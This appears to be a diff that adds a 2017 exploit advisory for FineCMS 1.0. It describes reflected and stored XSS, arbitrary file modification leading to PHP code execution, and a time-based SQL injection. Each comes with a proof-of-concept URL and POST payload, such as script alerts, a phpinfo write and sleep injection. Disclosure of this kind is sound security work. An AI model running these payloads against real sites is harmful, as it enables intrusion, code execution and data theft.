@@ -1,0 +1,114 @@
+# # # # #
+# Exploit Title: FineCMS 1.0  Multiple Vulnerabilities
+# Dork: N/A
+# Date: 29.08.2017
+# Vendor Homepage : http://mvc.net.pl/
+# Software Link: https://github.com/andrzuk/FineCMS
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+# Exploit Author: sohaip-hackerDZ
+# Author Web: http://www.hacker-ar.com
+# Author Social: @sohaip_hackerDZ
+# # # # #
+
+Reflected XSS in get_image.php
+Technical Description:
+file /application/lib/ajax/get_image.php the $_POST['id'] and $_POST['name'] and $_GET['folder'] without any validated, sanitised or output encoded.
+
+Proof of Concept(PoC)
+http://your_finecms/application/lib/ajax/get_image.php?folder=1
+
+POST:
+
+id=1"><script>alert(1)</script>&name=1
+
+Arbitrary File Modify
+Technical Description:
+The base function for modify the template can modify the filename,this leads to the Arbitrary File Modify, who could allow attacker getshell.
+
+file /appalication/core/controller/template.php line50-line53 
+
+follow function save() file /appalication/core/model/template.php line26-line48
+
+if file exists, we can modify it whihout any limit.
+
+insterestingly, there are two more Vulnerability for same function in different files.
+
+file /appalication/core/model/style.php line26-line48
+
+file /appalication/core/model/script.php line26-line48 
+
+Proof of Concept(PoC)
+http://your_finecms/index.php?route=template
+http://your_finecms/index.php?route=style
+http://your_finecms/index.php?route=script
+
+POST:
+contents=<?php phpinfo();?>&filename={any exist filename}&savabutton=Zapisz
+
+Authenticated SQL injection
+all FineCMS use PDO to connect the mysql server, so all the data without any validated, sanitised or output encoded injection database.but in application/core/controller/excludes.php, the website author use mysqli to connect mysql server.the lead SQL injection, who could allow attacker use some payload to get data in database.
+
+Technical Description:
+file application/core/controller/excludes.php line75, the visitor_ip insert into database without any validated, sanitised or output encoded.
+
+
+file /stat/get_stat_data.php line30
+
+
+the sql inject into sql_query and execute.
+
+Proof of Concept(PoC)
+http://your_finecms/index.php?route=excludes&action=add
+
+POST:
+visitor_ip=1%27%2Csleep%281%29%2C%271&save_button=Zapisz
+and view http://your_finecms/stat/get_stat_data.php,we can feel website loading sleep.
+
+
+Stored XSS in images.php
+FineCMS allow admin to upload image into gallery, and it will show image data into pages, but some data will output into pages without any validated, sanitised or output encoded. they allow attacker Cross Site Scripting.
+
+Technical Description:
+when we upload the file
+
+file application/core/controller/images.php line87
+
+
+and follow the function add() file application/core/model/images.php line78
+
+
+if filetype startwith "image",the filetype will insert into database
+
+when we view the detail of the images file application/lib/generators/view.php line106, somethings will output into pages.
+
+
+Proof of Concept(PoC)
+view the http://your_finecms/index.php?route=images&action=add and upload picture 
+
+modify the picture's filetype 
+
+view the detail of picture
+
+
+
+Because of the vulnerability also in edit detail page. so you also can use edit to insert Script code in pages.
+
+http://your_finecms/index.php?route=images&action=edit&id=15 
+
+view the detail of picture
+
+
+Stored XSS in visitors.php
+FineCMS stores all the visitors the visit url, but in detail of log they output into pages without any validated, sanitised or output encoded. they allow attacker Cross Site Scripting.
+
+Technical Description:
+just like last vulnerability.
+
+Proof of Concept(PoC)
+visit any page with js script code. such as
+
+index.php?route=images&action=view&id=14'"><script>alert(1)</script>
